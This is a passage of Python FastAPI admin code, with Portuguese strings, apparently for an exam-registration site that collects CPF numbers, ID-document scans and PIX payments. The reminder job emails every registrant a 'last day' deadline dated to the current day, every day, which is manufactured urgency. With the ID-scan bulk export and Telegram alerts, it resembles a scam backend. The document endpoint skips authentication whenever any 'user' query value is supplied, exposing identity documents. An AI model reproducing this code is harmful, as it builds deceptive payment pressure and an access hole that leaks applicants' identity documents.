async def telegram_test(data: TelegramTestIn, user=Depends(require_admin)):
    """Send a test message using either provided token/chat_id or saved settings."""
    s = await _db.settings.find_one({'_id': 'main'}) or {}
    token = (data.bot_token or s.get('telegram_bot_token') or '').strip()
    chat = str(data.chat_id or s.get('telegram_chat_id') or '').strip()
    if not token or not chat:
        raise HTTPException(400, 'Informe o Bot Token e o Chat ID antes de testar.')
    text = (
        "✅ <b>Teste de notificação</b>\n\n"
        "O painel administrativo está conectado ao Telegram com sucesso. "
        "A partir de agora você receberá uma mensagem aqui sempre que uma nova inscrição for criada."
    )
    res = await _telegram_send(token, chat, text)
    if not res.get('ok'):
        raise HTTPException(400, f"Falha ao enviar: {res.get('error', 'erro desconhecido')}")
    return res

@admin_router.post('/admin/reset-kpis')
async def reset_kpis(user=Depends(require_admin)):
    for c in ['accesses', 'registrations', 'pix_generated', 'pix_copied', 'pix_downloaded', 'events']:
        await _db[c].delete_many({})
    return {'ok': True}


# =========================================================
# DOCUMENTOS — frente/verso enviados pelos candidatos
# =========================================================
def _doc_kind(value: str):
    """Detecta levemente o tipo de um documento armazenado (data URL ou base64 cru).
    Retorna 'pdf', 'image' ou 'other'. Só decodifica um pequeno prefixo."""
    if not value:
        return None
    if value.startswith('data:'):
        header = value.split(',', 1)[0]
        ct = header.split(':', 1)[1].split(';', 1)[0].lower() if ':' in header else ''
        if ct == 'application/pdf':
            return 'pdf'
        if ct.startswith('image/'):
            return 'image'
        return 'other' if ct else 'image'
    import base64 as _b64
    try:
        head = _b64.b64decode(value[:16])
    except Exception:
        return 'image'
    if head[:4] == b'%PDF':
        return 'pdf'
    if head[:8] == b'\x89PNG\r\n\x1a\n' or head[:3] == b'\xff\xd8\xff' or head[:4] == b'RIFF' or head[:3] == b'GIF':
        return 'image'
    return 'image'


def _doc_decode(value: str):
    """Decodifica um documento (data URL ou base64 cru) para bytes + metadados.
    Retorna (raw_bytes, content_type, ext). Faz sniff de magic bytes quando falta o mime."""
    import base64 as _b64
    if not value:
        return None, None, None
    content_type = None
    if value.startswith('data:'):
        header, _, body = value.partition(',')
        if ':' in header and ';' in header:
            content_type = header.split(':', 1)[1].split(';', 1)[0].lower()
        b64_only = body
    else:
        b64_only = value
    try:
        raw = _b64.b64decode(b64_only)
    except Exception:
        return None, None, None
    if not content_type:
        if raw[:4] == b'%PDF':
            content_type = 'application/pdf'
        elif raw[:8] == b'\x89PNG\r\n\x1a\n':
            content_type = 'image/png'
        elif raw[:3] == b'\xff\xd8\xff':
            content_type = 'image/jpeg'
        elif raw[:4] == b'RIFF' and raw[8:12] == b'WEBP':
            content_type = 'image/webp'
        else:
            content_type = 'image/jpeg'
    if content_type == 'application/pdf':
        ext = 'pdf'
    elif content_type.startswith('image/'):
        ext = content_type.split('/', 1)[1].split('+')[0]
        if ext == 'jpeg':
            ext = 'jpg'
    else:
        ext = 'bin'
    return raw, content_type, ext


@admin_router.get('/admin/documentos')
async def listar_documentos(user=Depends(require_admin), q: str = '', limit: int = 200):
    """Lista cadastros que enviaram documentos (frente/verso)."""
    docs = []
    filtro = {}
    if q:
        rgx = {'$regex': q.strip(), '$options': 'i'}
        filtro['$or'] = [{'nome': rgx}, {'cpf': rgx}]

    cursor = _db.cadastros.find(filtro).sort('last_at', -1).limit(limit)
    async for c in cursor:
        fd = c.get('form_data') or {}
        frente = fd.get('doc_frente') or ''
        verso = fd.get('doc_verso') or ''
        # Só retorna cadastros que TÊM pelo menos um documento
        if not frente and not verso:
            continue
        docs.append({
            'id': str(c.get('_id', '')),
            'cpf': c.get('cpf') or '',
            'nome': c.get('nome') or '',
            'doc_tipo': fd.get('doc_tipo') or 'RG',
            'has_frente': bool(frente),
            'has_verso': bool(verso),
            'frente_kind': _doc_kind(frente) if frente else None,
            'verso_kind': _doc_kind(verso) if verso else None,
            'created_at': c.get('created_at', '').isoformat() if hasattr(c.get('created_at'), 'isoformat') else c.get('created_at', ''),
        })
    return {'items': docs, 'total': len(docs)}


@admin_router.get('/admin/documentos/{cpf}/{tipo}')
async def get_documento_arquivo(cpf: str, tipo: str, token: str = '', user=None):
    """Retorna a imagem base64 de um documento. tipo=frente|verso. Aceita token via query para <img src=>."""
    # Autenticação: header OR query param (para uso em <img src>)
    if not user:
        if not token:
            raise HTTPException(401, 'Não autenticado')
        try:
            import jwt as _jwt
            payload = _jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
            username = payload.get('sub')
            if not username: raise HTTPException(401, 'Token inválido')
        except Exception:
            raise HTTPException(401, 'Token inválido')

    if tipo not in ('frente', 'verso'):
        raise HTTPException(400, 'tipo inválido')

    c = await _db.cadastros.find_one({'cpf': cpf})
    if not c:
        raise HTTPException(404, 'não encontrado')
    fd = c.get('form_data') or {}
    b64 = fd.get(f'doc_{tipo}') or ''
    if not b64:
        raise HTTPException(404, 'sem documento')

    # Decodifica (data URL ou base64 cru) + detecta mime por magic bytes
    raw, content_type, _ext = _doc_decode(b64)
    if raw is None:
        raise HTTPException(500, 'documento corrompido')

    from fastapi.responses import Response
    disposition = 'inline; filename="documento.%s"' % (_ext or 'bin')
    return Response(content=raw, media_type=content_type, headers={'Content-Disposition': disposition, 'Cache-Control': 'no-store'})


@admin_router.post('/admin/documentos/download-zip')
async def download_documentos_zip(payload: Dict[str, Any], user=Depends(require_admin)):
    """Baixa documentos em ZIP. Body: {cpfs: ["...", "..."], all: false}."""
    import io, zipfile, base64

    cpfs = payload.get('cpfs') or []
    baixar_todos = bool(payload.get('all'))

    filtro = {}
    if not baixar_todos and cpfs:
        filtro['cpf'] = {'$in': cpfs}

    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, 'w', zipfile.ZIP_DEFLATED) as zf:
        count = 0
        cursor = _db.cadastros.find(filtro)
        async for c in cursor:
            fd = c.get('form_data') or {}
            frente = fd.get('doc_frente') or ''
            verso = fd.get('doc_verso') or ''
            if not (frente or verso):
                continue
            nome_safe = ''.join(ch for ch in (c.get('nome') or 'sem_nome') if ch.isalnum() or ch in '_ -').replace(' ', '_')[:50]
            cpf_safe = (c.get('cpf') or 'sem_cpf').replace('.', '').replace('-', '')
            pasta = f'{nome_safe}_{cpf_safe}'
            for tipo, data in [('frente', frente), ('verso', verso)]:
                if not data: continue
                raw, _ct, ext = _doc_decode(data)
                if raw is None:
                    continue
                try:
                    zf.writestr(f'{pasta}/{tipo}.{ext}', raw)
                    count += 1
                except Exception:
                    pass

    zbuf.seek(0)
    from fastapi.responses import Response
    filename = f'documentos_{datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")}.zip'
    return Response(
        content=zbuf.getvalue(),
        media_type='application/zip',
        headers={'Content-Disposition': f'attachment; filename="{filename}"'}
    )


# ------------ LEMBRETE DE PAGAMENTO (e-mail em massa) ------------
_lembrete_tasks: Dict[str, asyncio.Task] = {}


def _hoje_brasilia() -> str:
    return datetime.now(timezone(timedelta(hours=-3))).strftime('%d/%m/%Y')


def _lembrete_query() -> Dict[str, Any]:
    return {'finalized': True, 'email': {'$regex': '@'}}


@admin_router.get('/admin/inscricoes/lembrete-pagamento/resumo')
async def lembrete_resumo(user=Depends(require_admin)):
    hoje = _hoje_brasilia()
    total = await _db.inscricoes.count_documents(_lembrete_query())
    ja = await _db.inscricoes.count_documents({**_lembrete_query(), 'lembrete_enviado_dia': hoje})
    running = await _db.email_jobs.find_one({'status': 'enviando'}, {'_id': 0})
    return {'total': total, 'ja_enviados_hoje': ja, 'pendentes': total - ja, 'hoje': hoje, 'em_andamento': running}


async def _run_lembrete(job_id: str, base_url: str):
    hoje = _hoje_brasilia()
    prazo = f'hoje, {hoje}, às 23h59 (horário de Brasília)'
    enviados = falhas = 0
    try:
        cursor = _db.inscricoes.find({**_lembrete_query(), 'lembrete_enviado_dia': {'$ne': hoje}}, {'_id': 0})
        async for d in cursor:
            html = build_inscricao_email_html(
                nome=d.get('nome', ''), cpf=d.get('cpf', ''), protocolo=d.get('protocolo', ''),
                cargo=d.get('cargo_titulo', ''), concurso=d.get('concurso', ''), valor=VALOR_INSCRICAO,
                base_url=base_url, lembrete_prazo=prazo,
            )
            ok = await try_send_email(to=d['email'].strip().lower(),
                                      subject='Último dia: sua inscrição está pendente de pagamento', html=html)
            if ok:
                enviados += 1
                await _db.inscricoes.update_one({'id': d['id']}, {'$set': {
                    'lembrete_enviado_dia': hoje, 'lembrete_enviado_at': datetime.now(timezone.utc).isoformat()}})
            else:
                falhas += 1
            await _db.email_jobs.update_one({'id': job_id}, {'$set': {'enviados': enviados, 'falhas': falhas}})
            await asyncio.sleep(0.6)
        await _db.email_jobs.update_one({'id': job_id}, {'$set': {'status': 'concluido', 'finished_at': datetime.now(timezone.utc).isoformat()}})
        await insert_event('lembrete', f'Lembrete de pagamento enviado para {enviados} inscrito(s)', {'enviados': enviados, 'falhas': falhas})
    except Exception as e:
        logger.error(f'[lembrete] erro: {e}')
        await _db.email_jobs.update_one({'id': job_id}, {'$set': {'status': 'erro', 'erro': str(e)}})
    finally:
        _lembrete_tasks.pop(job_id, None)


@admin_router.post('/admin/inscricoes/lembrete-pagamento')
async def lembrete_enviar(request: Request, user=Depends(require_admin)):
    running = await _db.email_jobs.find_one({'status': 'enviando'}, {'_id': 0})
    if running and running['id'] in _lembrete_tasks:
        return running
    await _db.email_jobs.update_many({'status': 'enviando'}, {'$set': {'status': 'interrompido'}})
    hoje = _hoje_brasilia()
    total = await _db.inscricoes.count_documents({**_lembrete_query(), 'lembrete_enviado_dia': {'$ne': hoje}})
    job = {'id': str(uuid.uuid4()), 'tipo': 'lembrete_pagamento', 'status': 'enviando', 'total': total,
           'enviados': 0, 'falhas': 0, 'dia': hoje, 'started_at': datetime.now(timezone.utc).isoformat()}
    await _db.email_jobs.insert_one(dict(job))
    _lembrete_tasks[job['id']] = asyncio.create_task(_run_lembrete(job['id'], _site_base_url(request)))
    return job


@admin_router.get('/admin/inscricoes/lembrete-pagamento/status/{job_id}')
async def lembrete_status(job_id: str, user=Depends(require_admin)):
    job = await _db.email_jobs.find_one({'id': job_id}, {'_id': 0})
    if not job:
        raise HTTPException(404, 'Envio não encontrado')
    return job
